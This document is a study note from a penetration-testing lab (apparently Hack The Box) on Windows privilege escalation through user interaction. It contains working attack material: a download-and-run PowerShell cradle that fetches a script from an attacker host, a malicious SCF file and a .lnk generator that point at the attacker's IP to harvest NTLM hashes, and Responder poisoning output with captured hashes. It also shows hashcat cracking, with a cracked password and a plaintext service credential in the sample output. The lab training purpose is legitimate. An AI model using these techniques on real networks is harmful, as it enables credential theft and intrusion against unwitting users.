# Interacting with Users

## Traffic Capture

Tools like wireshark, tcpdump, and netcreds can be use to sniff the traffic on the network which may be transfering data through an insecure protocols/channel. This way we could read the information on what they are sending which may be the credentials and other sensitive information.

## Process Command Lines

**Monitoring for Process Command Lines**

Script for looking at process command lines. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

**Running Monitor Script on Target Host**

host script from our attack machine.

```powershell-session
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

## Vulnerable Services

{% embed url="https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e" %}
vulnerability in Docker Desktop Community Edition before 2.1.0.1
{% endembed %}

## SCF on a File Share

Shell Command File (SCF) is used by Windows Explorer to move up and down directories

**Malicious SCF File**

create the following file and name it something like `@Inventory.scf`

Here we put in our `tun0` IP address and any fake share name and .ico file name.

```shell-session
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

**Starting Responder**

start Responder on our attack box and wait for the user to browse the share.

```shell-session
sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.2.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [ON]

[+] Generic Options:
    Responder NIC              [tun2]
    Responder IP               [10.10.14.3]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[!] Error starting SSL server on port 443, check permissions or other servers running.
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

**Cracking NTLMv2 Hash with Hashcat**

```shell-session
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

### Capturing Hashes with a Malicious .lnk File

**Generating a Malicious .lnk File**

```powershell-session

$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Assessment

<details>

<summary>Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user.</summary>

![](<../../../.gitbook/assets/image (100).png>)

**Save the above file as @test.scf**

```
sudo responder -w -v -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.43.43
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\sccm_svc
[SMB] NTLMv2-SSP Hash     : sccm_svc::WINLPE-SRV01:b8ef45b23cf6575c:187E1A7AD81216516707095D67B5AB97:0101000000000000800CAF24E1BAD90145A3F67B23843D23000000000200080033004E003700390001001E00570049004E002D004D004A00560042004A00300049004C004F004D00320004003400570049004E002D004D004A00560042004A00300049004C004F004D0032002E0033004E00370039002E004C004F00430041004C000300140033004E00370039002E004C004F00430041004C000500140033004E00370039002E004C004F00430041004C0007000800800CAF24E1BAD901060004000200000008003000300000000000000001000000002000008B256E51080E3DC46636D1F5038C8FA35865BE001BB9786904532311BB6AF0540A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003500000000000000000000000000
```

**Crack the hash**

{% code overflow="wrap" %}
```
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

SCCM_SVC::WINLPE-SRV01:b8ef45b23cf6575c:187e1a7ad81216516707095d67b5ab97:0101000000000000800caf24e1bad90145a3f67b23843d23000000000200080033004e003700390001001e00570049004e002d004d004a00560042004a00300049004c004f004d00320004003400570049004e002d004d004a00560042004a00300049004c004f004d0032002e0033004e00370039002e004c004f00430041004c000300140033004e00370039002e004c004f00430041004c000500140033004e00370039002e004c004f00430041004c0007000800800caf24e1bad901060004000200000008003000300000000000000001000000002000008b256e51080e3dc46636d1f5038c8fa35865be001bb9786904532311bb6af0540a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003500000000000000000000000000:Password1
```
{% endcode %}

</details>
